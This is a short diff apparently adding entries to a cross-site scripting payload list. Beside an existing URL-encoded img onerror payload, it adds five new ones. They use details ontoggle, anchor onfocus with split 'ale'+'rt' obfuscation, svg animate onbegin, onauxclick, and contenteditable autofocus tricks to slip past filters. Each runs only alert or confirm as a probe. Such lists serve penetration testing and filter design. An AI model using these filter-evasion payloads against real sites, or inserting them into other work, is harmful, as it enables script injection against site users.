@@ -20,4 +20,14 @@
 
 %3Cimg%20src=x%20onerror=alert(%22MrHex88%22)%3E
 
+<deTaiLS/oPen/OntoGGle=alert(1)>
+
+<A Href=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
+
+<svg><animate onbegin=alert() attributeName=x></svg>
+
+<lol/onauxclick=[origin].some(confirm)>rightclickhere
+
+<lol/contenteditable/autofocus/onfocus="alert(1)">
+
 ```
